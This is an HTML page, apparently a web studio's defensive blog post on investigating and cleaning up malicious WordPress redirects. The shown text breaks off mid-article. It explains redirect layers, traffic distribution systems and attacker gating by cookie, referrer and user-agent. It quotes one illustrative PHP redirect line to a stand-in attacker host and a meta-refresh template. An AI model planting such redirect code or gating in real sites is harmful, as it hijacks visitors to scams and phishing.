@@ -1,0 +1,1386 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96" />
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation — Kawaki Studios</title>
+    <meta name="description" content="A forensic engineering guide to detecting, diagnosing, and eradicating WordPress malicious redirects, injected JavaScript, conditional .htaccess hijacks, and mobile traffic gating." />
+    <meta name="generator" content="Kawaki Blog Engine" />
+    <link rel="canonical" href="https://www.kawaki.co.in/blog/wordpress-malicious-redirects-cleanup" />
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://www.kawaki.co.in/blog/wordpress-malicious-redirects-cleanup" />
+    <meta property="og:title" content="WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation | Kawaki Studios" />
+    <meta property="og:description" content="A forensic engineering guide to detecting, diagnosing, and eradicating WordPress malicious redirects, injected JavaScript, conditional .htaccess hijacks, and mobile traffic gating." />
+    <meta property="og:image" content="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:site" content="@kawakistudios" />
+    <meta name="twitter:title" content="WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation | Kawaki Studios" />
+    <meta name="twitter:description" content="A forensic engineering guide to detecting, diagnosing, and eradicating WordPress malicious redirects, injected JavaScript, conditional .htaccess hijacks, and mobile traffic gating." />
+    <meta name="twitter:image" content="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80" />
+
+    <!-- Structured Data (JSON-LD) -->
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "headline": "WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation",
+    "description": "A forensic engineering guide to detecting, diagnosing, and eradicating WordPress malicious redirects, injected JavaScript, conditional .htaccess hijacks, and mobile traffic gating.",
+    "image": "https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80",
+    "datePublished": "2026-09-26T10:00:00.000Z",
+    "dateModified": "2026-09-26T10:00:00.000Z",
+    "author": {
+        "@type": "Person",
+        "name": "Kunal Sharma"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "@id": "https://www.kawaki.co.in/#organization",
+        "name": "Kawaki Studios",
+        "url": "https://www.kawaki.co.in",
+        "logo": "https://www.kawaki.co.in/assets/images/kawaki-logo.png"
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://www.kawaki.co.in/blog/wordpress-malicious-redirects-cleanup"
+    }
+}
+    </script>
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BreadcrumbList",
+    "itemListElement": [
+        {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "Home",
+            "item": "https://www.kawaki.co.in/"
+        },
+        {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "Blog",
+            "item": "https://www.kawaki.co.in/blog"
+        },
+        {
+            "@type": "ListItem",
+            "position": 3,
+            "name": "WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation",
+            "item": "https://www.kawaki.co.in/blog/wordpress-malicious-redirects-cleanup"
+        }
+    ]
+}
+    </script>
+
+    <!-- Premium Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Instrument+Serif:ital@0;1&family=Plus+Jakarta+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="/assets/css/global.css?v=20260902_luxury_v6" />
+    <link rel="stylesheet" href="/assets/css/chatbot.css?v=20260902_pill_v2" />
+
+    <style>
+        :root {
+            --color-bg: #FFFFFF;
+            --color-text: #12100E;
+            --color-muted: #6B7280;
+            --color-accent: #C6FF00;
+            --font-sans: "Plus Jakarta Sans", sans-serif;
+            --font-serif: "Instrument Serif", serif;
+            --font-mono: "JetBrains Mono", monospace;
+        }
+
+        body {
+            background-color: var(--color-bg);
+            color: var(--color-text);
+            font-family: var(--font-sans);
+            margin: 0;
+            padding: 0;
+            font-size: 17px;
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        em {
+            font-family: var(--font-serif);
+            font-style: italic;
+        }
+
+        .article-container {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 130px 24px 80px;
+        }
+
+        .article-breadcrumb {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--color-muted);
+            margin-bottom: 1.5rem;
+        }
+        .article-breadcrumb a {
+            color: var(--color-muted);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        .article-breadcrumb a:hover {
+            color: var(--color-accent);
+        }
+        .article-breadcrumb .bc-sep {
+            color: rgba(0,0,0,0.3);
+        }
+        .article-breadcrumb .bc-current {
+            color: var(--color-text);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 420px;
+        }
+
+        .back-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--color-muted);
+            text-decoration: none;
+            margin-bottom: 2rem;
+            transition: color 0.2s;
+        }
+        .back-link:hover {
+            color: var(--color-accent);
+        }
+
+        .article-meta-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-family: var(--font-mono);
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--color-accent);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 1rem;
+        }
+
+        .article-header-title {
+            font-size: clamp(2.4rem, 5vw, 3.8rem);
+            font-weight: 800;
+            line-height: 1.15;
+            letter-spacing: -0.03em;
+            margin: 0 0 1.5rem;
+            color: #111111;
+        }
+
+        .article-info-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 16px;
+            padding: 1.25rem 0;
+            border-top: 1px solid rgba(0,0,0,0.08);
+            border-bottom: 1px solid rgba(0,0,0,0.08);
+            margin-bottom: 2.5rem;
+            font-size: 14px;
+            color: var(--color-muted);
+        }
+
+        .author-box {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .author-avatar {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: #111111;
+            color: #FFFFFF;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 13px;
+        }
+
+        .article-hero-image {
+            width: 100%;
+            height: auto;
+            max-height: 480px;
+            object-fit: cover;
+            border-radius: 20px;
+            margin-bottom: 3rem;
+            box-shadow: 0 12px 35px rgba(0,0,0,0.06);
+        }
+
+        .article-content {
+            font-size: 1.125rem;
+            line-height: 1.8;
+            color: #2D2A26;
+        }
+
+        .article-content h1, 
+        .article-content h2, 
+        .article-content h3 {
+            color: #111111;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin: 2.5rem 0 1rem;
+        }
+        .article-content h2 {
+            font-size: 1.75rem;
+        }
+        .article-content h3 {
+            font-size: 1.35rem;
+        }
+
+        .article-content p {
+            margin-bottom: 1.5rem;
+        }
+
+        .article-content ul,
+        .article-content ol {
+            margin: 1.5rem 0;
+            padding-left: 2rem;
+        }
+
+        .article-content li {
+            margin-bottom: 0.5rem;
+        }
+
+        .article-content a {
+            color: #111111;
+            text-decoration: underline;
+            text-decoration-color: var(--color-accent);
+            text-underline-offset: 4px;
+            transition: color 0.2s;
+        }
+        .article-content a:hover {
+            color: #000000;
+        }
+
+        .article-content pre {
+            background: #111116;
+            color: #F4F4F5;
+            padding: 1.25rem;
+            border-radius: 12px;
+            overflow-x: auto;
+            font-family: var(--font-mono);
+            font-size: 14px;
+            margin: 1.5rem 0;
+        }
+
+        .article-content code {
+            font-family: var(--font-mono);
+            font-size: 14px;
+            background: rgba(0,0,0,0.06);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        .article-content pre code {
+            background: transparent;
+            padding: 0;
+            border-radius: 0;
+            color: inherit;
+        }
+
+        .article-content blockquote {
+            border-left: 3px solid var(--color-accent);
+            padding-left: 1.25rem;
+            margin: 2rem 0;
+            font-style: italic;
+            color: #4A4640;
+        }
+
+        .tag-pill {
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 50px;
+            background: rgba(0,0,0,0.05);
+            font-size: 12px;
+            font-weight: 600;
+            color: #4A4640;
+            margin-right: 6px;
+            margin-bottom: 6px;
+        }
+
+        .rlvnt-btn {
+            position: relative;
+            display: inline-flex;
+            gap: 8px;
+            border: 1px solid var(--color-text);
+            align-items: center;
+            justify-content: center;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-family: var(--font-serif);
+            font-weight: 400;
+            font-style: italic;
+            background: transparent;
+            color: var(--color-text);
+            font-size: 1rem;
+            overflow: hidden;
+            transition: color 0.4s, transform 0.3s, background-color 0.3s, border-color 0.3s;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        .rlvnt-btn.max-content {
+            width: max-content;
+            height: max-content;
+            font-size: 20px;
+            padding: 8px 16px;
+        }
+        .rlvnt-btn:hover {
+            background-color: var(--color-text);
+            color: #ffffff;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- SVG LIQUID LENS FILTER -->
+    <svg style="display: none;">
+        <defs>
+            <filter id="liquid-lens">
+                <feTurbulence type="fractalNoise" baseFrequency="0.01 0.03" numOctaves="1" result="turbulence"></feTurbulence>
+                <feDisplacementMap in="SourceGraphic" in2="turbulence" scale="40" xChannelSelector="R" yChannelSelector="G" result="displacement"></feDisplacementMap>
+            </filter>
+        </defs>
+    </svg>
+
+    <!-- GLOBAL FLOATING PILL NAVBAR -->
+    <div class="nav-wrapper" id="globalNav">
+        <nav>
+            <a href="/" class="nav-left" aria-label="Kawaki Studios">
+                <img src="/assets/images/kawaki-logo.png" alt="Kawaki Studios" class="site-header-logo" width="947" height="242" decoding="async" />
+            </a>
+            <a class="nav-center" href="mailto:hello@kawakistudios.com">hello@kawakistudios.com <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8 12a.5.5 0 0 0 .5-.5V5.707l2.146 2.147a.5.5 0 0 0 .708-.708l-3-3a.5.5 0 0 0-.708 0l-3 3a.5.5 0 1 0 .708.708L7.5 5.707V11.5a.5.5 0 0 0 .5.5"></path></svg></a>
+            <div class="nav-right" id="menuToggleBtn" aria-label="Open Menu">
+                <span id="menu-toggle-text">MENU</span>
+                <div id="menu-toggle-icon">
+                    <div class="bar bar-top"></div>
+                    <div class="bar bar-bottom"></div>
+                </div>
+            </div>
+        </nav>
+    </div>
+
+    <!-- FULLSCREEN OVERLAY MENU -->
+    <div class="fullscreen-menu" id="fullscreenMenu" style="display: none; opacity: 0; pointer-events: none;">
+        <div class="menu-overlay-layer"></div>
+        <div class="menu-overlay-layer"></div>
+        <div class="menu-content-wrapper">
+            <span class="span-menu"><em>kawaki</em></span>
+            <div class="menu-layout">
+                <div class="menu-col menu-col-left">
+                    <div class="main-menu-links" id="mainMenuPrimary">
+                        <ul>
+                            <li data-img="/assets/images/hero_slide_1_clean.webp" data-tag="Home — Studio Overview" data-desc="Digital Flagship &amp; Capabilities Overview">
+                                <a href="/">
+                                    <span class="menu-idx">01</span>
+                                    <span class="menu-text">Home <em>Index</em></span>
+                                </a>
+                            </li>
+                            <li data-img="/assets/images/hero_slide_2_clean.webp" data-tag="About Us — Editorial Manifesto" data-desc="Studio Philosophy &amp; Engineering Principles">
+                                <a href="/about">
+                                    <span class="menu-idx">02</span>
+                                    <span class="menu-text">About <em>Kawaki Studios</em></span>
+                                </a>
+                            </li>
+                            <li data-img="/assets/images/hero_slide_3_clean.webp" data-tag="Capabilities &amp; Architecture" data-desc="Five Core Engineering &amp; Recovery Pillars">
+                                <a href="/services" id="menuServicesTrigger" class="menu-services-trigger" aria-haspopup="true" aria-expanded="false">
+                                    <span class="menu-idx">03</span>
+                                    <span class="menu-text">Explore <em>Our Services</em></span>
+                                    <span class="menu-expand-badge" title="Expand services">+</span>
+                                </a>
+                            </li>
+                            <li data-img="/assets/images/about_hero_bg.jpg" data-tag="Architectural Concepts" data-desc="Reference Designs &amp; Engineering Blueprints">
+                                <a href="/case-studies">
+                                    <span class="menu-idx">04</span>
+                                    <span class="menu-text">Selected <em>Concepts &amp; Blueprints</em></span>
+                                </a>
+                            </li>
+                            <li data-img="/assets/images/station_drag_prism.webp" data-tag="Engineering &amp; Design Notes" data-desc="Essays on Web Engineering &amp; Performance">
+                                <a href="/blog">
+                                    <span class="menu-idx">05</span>
+                                    <span class="menu-text">Blogs &amp; <em>Insights</em></span>
+                                </a>
+                            </li>
+                            <li data-img="/assets/images/about-studio.webp" data-tag="15-Min Strategy Session" data-desc="Schedule a Technical Discovery Call">
+                                <a href="/contact">
+                                    <span class="menu-idx">06</span>
+                                    <span class="menu-text">Discovery <em>Call</em></span>
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+
+                    <!-- EXPANDED SERVICES SUB-NAVIGATION MEGA-MENU -->
+                    <div class="main-menu-services" id="mainMenuServices" style="display: none; opacity: 0;">
+                        <div class="menu-services-topbar">
+                            <button type="button" class="menu-services-back-btn" id="menuServicesBackBtn" aria-label="Back to main menu">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
+                                <span>Back to Menu</span>
+                            </button>
+                            <span class="menu-services-header-title">EXPLORE OUR SERVICES</span>
+                            <a href="/services" class="menu-services-hub-link">
+                                <span>All Services</span>
+                                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="5" y1="12" x2="19" y2="12"></line><polyline points="12 5 19 12 12 19"></polyline></svg>
+                            </a>
+                        </div>
+
+                        <div class="menu-services-grid">
+                            <div class="menu-services-group">
+                                <div class="menu-services-cat-title">// WEB &amp; COMMERCE</div>
+                                <ul class="menu-services-list">
+                                    <li data-img="/assets/images/project_1.jpg" data-tag="Web Engineering" data-desc="Custom Websites &amp; Next.js Web Applications">
+                                        <a href="/services/custom-web-development">
+                                            <span class="sub-idx">01</span>
+                                            <span class="sub-name">Custom Web Development</span>
+                                        </a>
+                                    </li>
+                                    <li data-img="/assets/images/about_hero_bg.jpg" data-tag="Commerce Engineering" data-desc="Custom Storefronts &amp; Theme Customization">
+                                        <a href="/services/shopify-development">
+                                            <span class="sub-idx">02</span>
+                                            <span class="sub-name">Shopify Development</span>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
+
+                            <div class="menu-services-group">
+                                <div class="menu-services-cat-title">// AI &amp; AUTOMATION</div>
+                                <ul class="menu-services-list">
+                                    <li data-img="/assets/images/station_drag_prism.webp" data-tag="Intelligent Systems" data-desc="n8n, Make &amp; Deterministic AI Agent Workflows">
+                                        <a href="/services/ai-automation">
+                                            <span class="sub-idx">03</span>
+                                            <span class="sub-name">AI Automation</span>
+                                        </a>
+                                    </li>
+                                    <li data-img="/assets/images/hero_slide_3_clean.webp" data-tag="Search Engineering" data-desc="AI Search Optimization, AEO &amp; GEO Architecture">
+                                        <a href="/services/ai-search-optimization">
+                                            <span class="sub-idx">04</span>
+                                            <span class="sub-name">AI Search Optimization</span>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
+
+                            <div class="menu-services-group">
+                                <div class="menu-services-cat-title">// SECURITY &amp; RECOVERY</div>
+                                <ul class="menu-services-list">
+                                    <li data-img="/assets/images/hero_slide_1_clean.webp" data-tag="Security &amp; Recovery" data-desc="Hacked Site Cleanup &amp; Database Sanitization">
+                                        <a href="/services/wordpress-malware-removal">
+                                            <span class="sub-idx">05</span>
+                                            <span class="sub-name">WordPress Malware Removal</span>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
+
+                            <div class="menu-services-group">
+                                <div class="menu-services-cat-title">// CREATIVE &amp; SPECIALIST</div>
+                                <ul class="menu-services-list">
+                                    <li data-img="/assets/images/hero_slide_2_clean.webp" data-tag="Brand &amp; Creative" data-desc="Social Presence &amp; Content Architecture">
+                                        <a href="/services">
+                                            <span class="sub-idx">06</span>
+                                            <span class="sub-name">Social Media Management</span>
+                                        </a>
+                                    </li>
+                                    <li data-img="/assets/images/about-studio.webp" data-tag="Motion Design" data-desc="Short-Form Video &amp; Editorial Motion Content">
+                                        <a href="/services">
+                                            <span class="sub-idx">07</span>
+                                            <span class="sub-name">Reel Editing</span>
+                                        </a>
+                                    </li>
+                                    <li data-img="/assets/images/kw-project-ecomm.webp" data-tag="Spatial &amp; 3D" data-desc="Visual Product Modeling &amp; 3D Interactive Assets">
+                                        <a href="/services">
+                                            <span class="sub-idx">08</span>
+                                            <span class="sub-name">3D Design</span>
+                                        </a>
+                                    </li>
+                                    <li data-img="/assets/images/project_3_1787254295127.webp" data-tag="Spatial Planning" data-desc="Architectural Modeling &amp; Environmental Visualization">
+                                        <a href="/services">
+                                            <span class="sub-idx">09</span>
+                                            <span class="sub-name">Architecture Planning</span>
+                                        </a>
+                                    </li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="menu-col menu-col-right">
+                    <div class="menu-preview-card" id="menuPreviewCard">
+                        <div class="menu-preview-img-box">
+                            <img id="menuPreviewImg" src="/assets/images/station_drag_prism.webp" alt="Preview" width="1376" height="768" loading="lazy" decoding="async" />
+                        </div>
+                        <div class="menu-preview-meta">
+                            <span class="menu-preview-badge" id="menuPreviewTag">Engineering &amp; Design Notes</span>
+                            <span class="menu-preview-desc" id="menuPreviewDesc">Custom Web Design &amp; Development</span>
+                        </div>
+                    </div>
+
+                    <div class="menu-info-block">
+                        <div class="menu-status-pill">
+                            <span class="status-dot"></span>
+                            <span>Available for Select Projects</span>
+                        </div>
+                        <a href="/contact" class="menu-cta-button">
+                            <span>Schedule a Call</span>
+                            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16">
+                                <circle cx="8" cy="8" r="8" fill="#C6FF00"></circle>
+                                <path fill="#FFFFFF" d="M5.904 10.803a.5.5 0 1 1-.707-.707L9.293 6H6.525a.5.5 0 1 1 0-1H10.5a.5.5 0 0 1 .5.5v3.975a.5.5 0 0 1-1 0V6.707z"></path>
+                            </svg>
+                        </a>
+                        <a href="mailto:hello@kawakistudios.com" class="menu-email-link">hello@kawakistudios.com</a>
+                    </div>
+
+                    <div class="menu-socials-strip">
+                        <span class="socials-title">Follow</span>
+                        <div class="social-tags">
+                            <a href="https://linkedin.com/company/kawaki-studios" target="_blank" rel="noopener">LinkedIn ↗</a>
+                            <a href="https://twitter.com/kawakistudios" target="_blank" rel="noopener">Twitter / X ↗</a>
+                            <a href="https://instagram.com/kawaki.agency" target="_blank" rel="noopener">Instagram ↗</a>
+                            <a href="https://behance.net" target="_blank" rel="noopener">Behance ↗</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN ARTICLE BODY -->
+    <main class="article-container">
+        <!-- Breadcrumbs -->
+        <nav aria-label="Breadcrumb" class="article-breadcrumb">
+            <a href="/">Home</a>
+            <span class="bc-sep">/</span>
+            <a href="/blog">Blog</a>
+            <span class="bc-sep">/</span>
+            <span class="bc-current">WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation</span>
+        </nav>
+
+        <a href="/blog" class="back-link">
+            ← Back to all stories
+        </a>
+
+        <article id="articleWrapper">
+            <div class="article-meta-badge" id="articleCategory">
+                ● WordPress Security
+            </div>
+            
+            <h1 class="article-header-title" id="articleTitle">
+                WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation
+            </h1>
+
+            <div class="article-info-bar">
+                <div class="author-box">
+                    <div class="author-avatar" id="authorInitial">KS</div>
+                    <div>
+                        <div style="font-weight: 700; color: #111111;" id="authorName">Kunal Sharma</div>
+                        <div style="font-size: 12px;" id="articleDate">26 Sep 2026</div>
+                    </div>
+                </div>
+                <div style="font-family: var(--font-mono); font-size: 13px;" id="articleViews">
+                    195 reads
+                </div>
+            </div>
+
+            <img id="articleImage" src="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80" alt="WordPress Malicious Redirects: Forensic Investigation of Injected JavaScript, Conditional .htaccess Hijacks, and Mobile-Only Redirect Remediation" class="article-hero-image" width="1200" height="855" fetchpriority="high" decoding="async" />
+
+            <div class="article-content" id="articleContent">
+                <p>You enter your website URL into your desktop browser, and the page loads cleanly. Your navigation menus respond instantly, the layout is flawless, and your analytics dashboard shows active visitors. Then customer support tickets begin trickling in: visitors clicking your links from Google search on their smartphones are being routed to deceptive lottery wheels, fraudulent antivirus warnings, adult portals, or credential-harvesting phishing forms. You test the site again from your office laptop—everything renders normally. </p>
+<p>This baffling discrepancy is the hallmark of a <strong>WordPress malicious redirect</strong>. </p>
+<blockquote>
+<h3>What is a WordPress Malicious Redirect?</h3>
+<p>A WordPress malicious redirect occurs when unauthorized code or server rewrite directives compromise a website to silently hijack legitimate visitor traffic and route it to external, attacker-controlled destinations. These attacks rarely execute uniformly. Threat actors construct conditional gating mechanisms that inspect incoming HTTP headers, user-agents, referrers, and session cookies. Consequently, the redirect triggers exclusively for organic search visitors or mobile users while remaining entirely invisible to authenticated site administrators and desktop reviewers.</p>
+</blockquote>
+<p>When dealing with redirect infections, website owners frequently attempt surface-level remediation: deleting a recently edited theme file, clearing their CDN cache, or installing a security plugin to run a quick scan. Hours later, the redirects resume. Deleting the visible symptom without identifying the persistent dropper script, database transient, rogue Must-Use plugin, or server-level rewrite directive guarantees reinfection.</p>
+<p>This engineering guide provides a comprehensive forensic breakdown of how WordPress malicious redirects operate, why they evade casual detection through conditional execution, where redirect payloads conceal themselves across the technology stack, and how to execute a systematic 10-stage eradication and hardening protocol to permanently secure your web platform.</p>
+<hr />
+<h2>1. How WordPress Malicious Redirects Work</h2>
+<p>To investigate and dismantle a redirect infection, responders must first categorize the execution layer where the detour occurs. Redirection can occur at multiple stages of the web request lifecycle—from early network routing and web server daemon evaluation down to client-side DOM execution inside the user's browser.</p>
+<pre><code>┌────────────────────────────────────────────────────────────────────────┐
+│                   THE REDIRECT EXECUTION TAXONOMY                      │
+├─────────────────────┬───────────────────┬──────────────────────────────┤
+│ Execution Layer     │ Mechanism         │ Typical Forensic Signature   │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Web Server Daemon   │ .htaccess / Nginx │ HTTP 301/302 Location header │
+│ (Early Request)     │ rewrite rules     │ emitted before PHP executes. │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ PHP Runtime         │ wp-config /       │ FastCGI auto_prepend_file or │
+│ (Pre-Application)   │ .user.ini hooks   │ early require_once hooks.    │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ WordPress Core/     │ wp_redirect() or  │ Functions hooked into 'init' │
+│ Theme Application   │ header("Location")│ or 'template_redirect'.      │
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Database-Driven     │ Injected scripts  │ Serialized values or content │
+│ Content             │ in wp_options     │ pulled dynamically on render.│
+├─────────────────────┼───────────────────┼──────────────────────────────┤
+│ Client-Side Browser │ Injected JS or    │ DOM script tags, inline eval,│
+│ (Post-Render)       │ &lt;meta&gt; refresh    │ window.location manipulation.│
+└─────────────────────┴───────────────────┴──────────────────────────────┘
+</code></pre>
+<h3>A. HTTP-Level and Server-Side Redirection</h3>
+<p>Server-level redirects occur before WordPress bootstraps its environment. When a web server (such as Apache, LiteSpeed, or Nginx) processes an incoming HTTP request, rewrite modules evaluate configuration directives:</p>
+<ul>
+<li><strong>HTTP 301 (Moved Permanently):</strong> Instructs browsers and search engine crawlers to cache the destination indefinitely. When attackers deploy 301 redirects, victims' browsers continue redirecting even after the malicious rule is excised from the server, until local browser caches are manually purged.</li>
+<li><strong>HTTP 302 (Found) &amp; HTTP 307 (Temporary Redirect):</strong> The most common status codes leveraged by attackers. Temporary redirects tell the client to check the original URL on future visits, preventing aggressive browser caching while instantly forwarding the visitor.</li>
+</ul>
+<p>Because server-level redirects return HTTP headers immediately, no HTML or JavaScript is ever parsed by the client.</p>
+<h3>B. Application-Layer PHP Redirection</h3>
+<p>If the web server directives are pristine, the hijack may originate within the WordPress PHP execution lifecycle. Attackers hook into early WordPress action hooks—most commonly <code>init</code>, <code>wp_loaded</code>, or <code>template_redirect</code>:</p>
+<ul>
+<li>Utilizing native WordPress functions such as <code>wp_redirect()</code> or <code>wp_safe_redirect()</code>.</li>
+<li>Invoking raw PHP transport headers: <code>header("Location: https://malicious-traffic-broker.com/in"); exit;</code>.</li>
+</ul>
+<p>Because PHP executes entirely on the server, viewing the rendered browser DOM or inspecting the page source code will reveal zero malicious JavaScript. The browser simply receives an HTTP redirect header generated dynamically by application logic.</p>
+<h3>C. Client-Side Browser and JavaScript Redirection</h3>
+<p>Client-side redirects occur after the web server and WordPress have successfully delivered an HTTP <code>200 OK</code> HTML document to the browser. Once the HTML parser encounters an inline <code>&lt;script&gt;</code> tag or loads a compromised external <code>.js</code> bundle, client-side execution takes over:</p>
+<ul>
+<li>Direct window manipulation: Assigning values to <code>window.location.href</code>, <code>window.location.replace()</code>, or <code>document.location</code>.</li>
+<li>Simulated interactions: Scripting clicks on dynamically generated hidden anchor tags.</li>
+<li>Meta Refresh directives: Injecting <code>&lt;meta http-equiv="refresh" content="0;url=https://..."&gt;</code> tags into the document <code>&lt;head&gt;</code> or post body.</li>
+</ul>
+<h3>D. Multi-Hop Redirect Chains</h3>
+<p>Modern cybercrime syndicates rarely route a victim directly from a compromised WordPress site to the final phishing or scam portal. Direct redirection would allow security scanners and anti-malware blocklists (such as Google Safe Browsing) to identify and shut down the monetization landing page within hours. </p>
+<p>Instead, threat actors employ multi-tier <strong>Traffic Distribution Systems (TDS)</strong>:</p>
+<ol>
+<li><strong>The Origin (Compromised Site):</strong> Fires an unobtrusive trigger forwarding the user to a Traffic Distribution System gate.</li>
+<li><strong>The Traffic Broker (TDS Node):</strong> Filters traffic based on IP reputation, operating system, carrier, and referrer. If the visitor is identified as a crawler, security researcher, or invalid demographic, the TDS serves a blank 200 OK or redirects back to the legitimate site.</li>
+<li><strong>The Affiliate Dispatcher:</strong> If the visitor is a valid consumer on a mobile carrier, the TDS routes through intermediate tracking links to rotate affiliate IDs.</li>
+<li><strong>The Monetization Endpoint:</strong> The user lands on a rogue dating portal, tech-support scam, predatory financial scheme, or exploit kit download page.</li>
+</ol>
+<p>Tracing this multi-hop chain is essential during forensic investigation to determine whether the destination is static or part of an evolving dynamic network. If your platform is actively redirecting visitors, our emergency <a href="/services/malicious-redirect-removal">WordPress Malicious Redirect Removal &amp; Cleanup</a> service provides instant containment and forensic deconstruction.</p>
+<hr />
+<h2>2. Why You May Not See the Redirect Yourself</h2>
+<p>The single most frustrating aspect of a redirect infection for site owners is the inability to reproduce it on demand. Site administrators frequently dismiss customer complaints as local browser malware or user error because their own testing reveals a clean, functional site. </p>
+<p>Attackers intentionally engineer <strong>conditional gating logic</strong> to preserve stealth and delay discovery for as long as possible.</p>
+<pre><code>[Incoming Web Visitor Request]
+               │
+               ▼
+┌────────────────────────────────────────────────────────┐
+│ 1. Is the visitor an Administrator?                   │
+│    (Checks: wordpress_logged_in_* cookie, wp-admin IP) │
+└──────────────────────┬─────────────────────────────────┘
+                       │
+       ┌───────────────┴───────────────┐
+      YES                              NO
+       │                               │
+       ▼                               ▼
+[SERVE CLEAN SITE]    ┌──────────────────────────────────┐
+                      │ 2. Did they come from Search?    │
+                      │    (Checks: HTTP_REFERER header) │
+                      └────────────────┬─────────────────┘
+                                       │
+                       ┌───────────────┴───────────────┐
+                      NO                              YES
+                       │                               │
+                       ▼                               ▼
+              [SERVE CLEAN SITE]      ┌──────────────────────────────────┐
+                                      │ 3. Is the device a Smartphone?   │
+                                      │    (Checks: HTTP_USER_AGENT)     │
+                                      └────────────────┬─────────────────┘
+                                                       │
+                                       ┌───────────────┴───────────────┐
+                                      NO                              YES
+                                       │                               │
+                                       ▼                               ▼
+                              [SERVE CLEAN SITE]      ┌──────────────────────────────────┐
+                                                      │ 4. Have they visited today?      │
+                                                      │    (Checks: tracking cookie)     │
+                                                      └────────────────┬─────────────────┘
+                                                                       │
+                                                       ┌───────────────┴───────────────┐
+                                                      YES                              NO
+                                                       │                               │
+                                                       ▼                               ▼
+                                              [SERVE CLEAN SITE]             [EXECUTE REDIRECT]
+</code></pre>
+<h3>The Seven Evasion Filters of Conditional Redirection</h3>
+<h4>1. User-Agent Discrimination</h4>
